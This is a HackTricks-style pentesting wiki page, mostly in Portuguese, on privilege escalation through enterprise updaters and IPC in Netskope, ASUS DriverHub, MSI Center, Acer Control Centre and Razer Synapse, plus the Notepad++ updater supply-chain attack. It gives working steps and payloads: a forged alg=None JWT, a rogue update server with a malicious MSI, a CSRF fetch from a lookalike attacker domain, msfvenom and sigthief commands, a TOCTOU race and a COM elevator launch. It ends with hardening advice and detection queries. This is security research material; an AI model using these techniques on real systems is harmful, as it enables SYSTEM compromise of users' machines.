# Abusando Atualizadores Automáticos Empresariais e IPC Privilegiado (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de escalonamento de privilégio local do Windows encontradas em agentes e atualizadores de endpoint empresariais que expõem uma superfície de IPC de baixa fricção e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário com poucos privilégios pode coagir o enrollment para um servidor controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave que você pode reutilizar contra produtos semelhantes:
- Abusar do localhost IPC de um serviço privilegiado para forçar re-enrollment ou reconfiguração para um servidor controlado pelo atacante.
- Implementar os endpoints de atualização do fornecedor, entregar uma Trusted Root CA maliciosa, e apontar o updater para um pacote malicioso “signed”.
- Evadir verificações fracas de signer (CN allow-lists), flags de digest opcionais, e propriedades MSI laxas.
- Se o IPC estiver “encrypted”, derivar a key/IV a partir de identificadores da máquina legíveis por todos (world-readable) armazenados no registry.
- Se o serviço restringe chamadores por image path/process name, injetar em um processo allow-listed ou spawnar um processo suspenso e bootstrapar seu DLL via um patch mínimo no thread-context.

---
## 1) Forçando o enrollment para um servidor atacante via localhost IPC

Muitos agentes incluem um processo UI em user-mode que conversa com um serviço SYSTEM sobre localhost TCP usando JSON.

Observado em Netskope:
- UI: stAgentUI (low integrity) ↔ Serviço: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo de exploração:
1) Crie um token JWT de enrollment cujas claims controlam o host de backend (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja requerida.
2) Envie a mensagem IPC invocando o comando de provisioning com seu JWT e o nome do tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a contatar seu servidor rogue para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Se a verificação do chamador for path/name-based, origine a requisição a partir de um allow-listed vendor binary (veja §4).

---
## 2) Hijacking do update channel para executar código como SYSTEM

Depois que o cliente se comunica com seu servidor, implemente os endpoints esperados e direcione-o para um MSI atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retornar uma configuração JSON com um intervalo de updater muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado CA em PEM. O serviço o instala no repositório Trusted Root da máquina local.
3) /v2/checkupdate → Fornece metadata apontando para um MSI malicioso e uma versão falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: o serviço pode apenas verificar se o Subject CN é “netSkope Inc” ou “Netskope, Inc.”. Sua rogue CA pode emitir um certificado leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade MSI benign chamada CERT_DIGEST. Nenhuma verificação aplicada durante a instalação.
- Optional digest enforcement: a flag de configuração (ex.: check_msi_digest=false) desativa validações criptográficas extras.

Result: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumere os named pipes candidatos:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Minerar dados de roteamento suportados pelo Registry usados por servidores IPC baseados em plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraia primeiro os nomes de endpoints, as chaves JSON e os command IDs do cliente em user-mode. Frontends Electron/.NET empacotados frequentemente leak o full schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Se o alvo autenticar chamadores apenas por PID, image path, ou process name, trate isso como um percalço em vez de uma barreira: injetar no cliente legítimo, ou estabelecer a conexão a partir de um processo na lista de permissões, frequentemente é suficiente para satisfazer as verificações do servidor. Para named pipes especificamente, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) aborda a primitiva com mais profundidade.

---
## 1) CSRF de browser-para-localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

DriverHub instala um serviço HTTP em modo usuário (ADU.exe) em 127.0.0.1:53000 que espera chamadas de browser vindas de https://driverhub.asus.com. O filtro de origem simplesmente executa `string_contains(".asus.com")` sobre o header Origin e sobre URLs de download expostas por `/asus/v1.0/*`. Qualquer host controlado pelo atacante, como `https://driverhub.asus.com.attacker.tld`, portanto, passa na verificação e pode emitir requisições que alteram estado a partir de JavaScript. Veja [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para padrões de bypass adicionais.

Fluxo prático:
1) Registre um domínio que incorpore `.asus.com` e hospede lá uma página maliciosa.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o corpo JSON esperado pelo handler – o frontend JS empacotado mostra o esquema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Até mesmo o PowerShell CLI mostrado abaixo tem sucesso quando o Origin header é falsificado para o valor confiável:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualquer visita do navegador ao site do atacante torna-se, portanto, um CSRF local de 1 clique (ou 0 cliques via `onload`) que aciona um helper em contexto SYSTEM.

---
## 2) Verificação insegura de assinatura de código & clonagem de certificado (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` baixa executáveis arbitrários definidos no corpo JSON e os armazena em cache em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceito. Após o download, ADU.exe apenas verifica que o PE contém uma assinatura e que a string Subject corresponde a ASUS antes de executá-lo – sem `WinVerifyTrust`, sem validação da cadeia.

Para explorar o fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o assinante da ASUS nele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio que imite `.asus.com` e dispare UpdateApp via o CSRF no navegador descrito acima.

Como tanto o filtro de Origin quanto o de URL são baseados em substring e a verificação do assinante apenas compara strings, o DriverHub baixa e executa o binário do atacante com seu contexto elevado.

---
## 1) TOCTOU dentro dos caminhos de cópia/execução do updater (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP onde cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente central (Component ID `0f 27 00 00`) provê `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura via `CS_CommonAPI.EX_CA::Verify` (o subject do certificado deve ser “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma scheduled task que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não fica bloqueado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binário legítimo assinado pela MSI (garante que a verificação de assinatura passe e que a tarefa seja enfileirada).
- Competir com múltiplas mensagens Frame B repetidas que apontam para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a verificação ser concluída.

Quando o scheduler dispara, ele executa o payload sobrescrito sob SYSTEM apesar de ter validado o arquivo original. Exploração confiável usa duas goroutines/threads que disparam CMD_AutoUpdateSDK até vencer a janela TOCTOU.

---
## 2) Abusando de IPC de nível SYSTEM personalizado & impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP do MSI Center
- Cada plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes direcionem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` com **nenhuma validação de assinatura** – qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução como SYSTEM de forma determinística.
- Sniffar o loopback com Wireshark ou instrumentar os binários .NET no dnSpy revela rapidamente o mapeamento Component ↔ command; clientes Go/Python customizados podem então reproduzir os frames.

### Named pipes do Acer Control Centre & níveis de impersonation
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e seu ACL discricionário permite clientes remotos (ex.: `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um caminho de arquivo invoca a rotina do serviço que cria processos.
- A biblioteca cliente serializa um byte terminador mágico (113) junto com os args. Instrumentação dinâmica com Frida/`TsDotNetLib` (veja [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um integrity SID antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) entra no ramo genérico que mantém o token SYSTEM completo e define um integrity SID alto (`S-1-16-12288`). O binário gerado, portanto, roda como SYSTEM sem restrições, tanto localmente quanto entre máquinas.
- Combine isso com a flag de instalador exposta (`Setup.exe -nocheck`) para levantar o ACC mesmo em VMs de laboratório e testar o pipe sem hardware do fornecedor.

Esses bugs de IPC destacam por que serviços localhost devem impor autenticação mútua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) e por que o helper “run arbitrary binary” de cada módulo deve compartilhar as mesmas verificações de assinante.

---
## 3) COM/IPC “elevator” helpers respaldados por validação fraca em user-mode (Razer Synapse 4)

Razer Synapse 4 adicionou outro padrão útil a essa família: um usuário de baixo privilégio pode solicitar que um helper COM lance um processo via `RzUtility.Elevator`, enquanto a decisão de confiança é delegada a uma DLL em user-mode (`simple_service.dll`) em vez de ser aplicada de forma robusta dentro da fronteira privilegiada.

Caminho de exploração observado:
- Instanciar o objeto COM `RzUtility.Elevator`.
- Chamar `LaunchProcessNoWait(<path>, "", 1)` para requisitar um lançamento elevado.
- No PoC público, o gate de assinatura PE dentro de `simple_service.dll` é patchado antes de emitir a requisição, permitindo que um executável arbitrário escolhido pelo atacante seja lançado.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Sequestro remoto da cadeia de suprimentos via validação fraca do updater (WinGUp / Notepad++)

Atualizadores do Notepad++ baseados em WinGUp mais antigos não verificavam totalmente a autenticidade das atualizações. Quando atacantes comprometeram o provedor de hospedagem do servidor de atualização, podiam adulterar o manifest XML e redirecionar apenas clientes escolhidos para URLs do atacante. Como o cliente aceitava qualquer resposta HTTPS sem exigir tanto uma cadeia de certificados confiável quanto uma assinatura PE válida, as vítimas baixavam e executavam um NSIS `update.exe`.

Fluxo operacional (nenhum exploit local necessário):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando um instalador que não seja o Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Esses padrões se generalizam para qualquer updater que aceite unsigned manifests ou que não fixe os installer signers — network hijack + malicious installer + BYO-signed sideloading resulta em remote code execution sob o disfarce de “trusted” updates.

---
## Referências
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
